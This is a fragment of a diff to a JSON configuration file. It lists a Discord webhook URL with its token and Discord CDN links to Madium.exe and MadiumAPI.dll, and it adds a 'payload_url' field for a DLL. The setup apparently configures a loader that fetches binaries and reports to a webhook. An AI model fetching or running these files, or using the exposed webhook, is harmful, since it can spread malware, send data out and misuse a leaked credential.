@@ -1,5 +1,6 @@
 {
   "webhook": "https://discord.com/api/webhooks/1507722937195692072/VRRprOM0goKJlgcoWVLV3Z1-76y6P51RL1l4uxX2xhMhVHSSig6-gbBtH39LHehASQGx",
+  "payload_url": "https://cdn.discordapp.com/attachments/.../a.dll",
   "download_urls": [
     "https://cdn.discordapp.com/attachments/1507455663503052911/1543937141611044914/Madium.exe?ex=6a96af03&is=6a955d83&hm=e9c80048ea21eae9531f5d8013fa02662177738f035e3f2cd23b502bfba68cdc&",
     "https://cdn.discordapp.com/attachments/1507455663503052911/1543939257079570493/MadiumAPI.dll?ex=6a96b0fb&is=6a955f7b&hm=68ef29feeec89390cb32ec65bc5d99f4f27758c07d73e0d4b7b5be8845992a38&",
